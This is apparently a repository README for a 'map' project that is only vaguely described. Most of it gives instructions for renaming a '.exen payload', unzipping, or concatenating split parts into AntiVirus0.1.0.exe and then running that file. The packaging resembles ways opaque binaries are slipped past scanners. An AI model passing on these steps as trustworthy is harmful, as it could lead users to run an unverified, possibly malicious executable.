# AntiVirus-Map

AntiVirus-Map is a simple map-based project that can be explored by walking around inside it and used for testing movement, layout, and interaction in the environment.

## What this project is

This repository contains the packaged map executable and a small set of supporting files so the project can be opened, inspected, and run from a source-based workspace.

## How it works

The project is centered around a map that you can run and explore. The main purpose is to walk through the environment, test how it feels to move around inside it, and use it as a basic testing space for the map experience.

## How to use it

1. Clone the repository.
2. If a single `AntiVirus0.1.0.exe` file is present, open it from the repository root and run it.
3. If you only have a legacy payload such as `AntiVirus0.1.0.exen`, the included launcher will copy it into `AntiVirus0.1.0.exe` for you automatically.
4. If the release was packaged as a zip archive such as `AntiVirus0.1.0.zip`, the launcher will unpack the embedded executable into `AntiVirus0.1.0.exe` before launching it.
5. If the executable has been split into parts (for example `AntiVirus0.1.0.exe.part01`, `AntiVirus0.1.0.exe.part02`, ...), join the parts to produce the real executable before running. The repository includes a small, cross-platform helper to assemble parts automatically; using it is recommended over manual concatenation.

Joining examples and helpers:

- On Linux / macOS:

```bash
cd /path/to/repo
cat AntiVirus0.1.0.exe.part* > AntiVirus0.1.0.exe
```

- On Windows (cmd.exe):

```cmd
copy /b AntiVirus0.1.0.exe.part01+AntiVirus0.1.0.exe.part02 AntiVirus0.1.0.exe
```

Recommended (cross-platform): use the included Python helper which also supports creating a zip archive for distribution:

```bash
python3 scripts/assemble_release.py --repo .
python3 scripts/assemble_release.py --repo . --archive AntiVirus0.1.0.zip
```

Windows PowerShell helper

If you prefer a PowerShell helper to run on Windows directly, there's `scripts/assemble_release.ps1` which concatenates parts and can optionally create a zip archive:

```powershell
# Assemble parts in the current folder
.\scripts\assemble_release.ps1 -Repo .

# Assemble and create a zip archive
.\scripts\assemble_release.ps1 -Repo . -Archive AntiVirus0.1.0.zip
```

After assembling the executable you can run it directly, or use the included launcher which will try to auto-assemble split parts if needed.

Create a distributable ZIP

If you need a ready-to-distribute ZIP (so users don't have to assemble parts), use the helper that packages the available executable or payload into `AntiVirus0.1.0.zip`:

```bash
# Create AntiVirus0.1.0.zip in the repository root
python3 scripts/create_release_zip.py
# On Windows
py -3 scripts/create_release_zip.py
```

The script will prefer an existing `AntiVirus0.1.0.exe`, then a legacy `AntiVirus0.1.0.exen`, then attempt to assemble split parts. If none are found it exits with an error.

## Open source notes

The repository is now organized as an open-source project with source files, tests, and contribution guidance so others can inspect or improve it.

## Acknowledgements

This project was helped by Quaternius as well.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
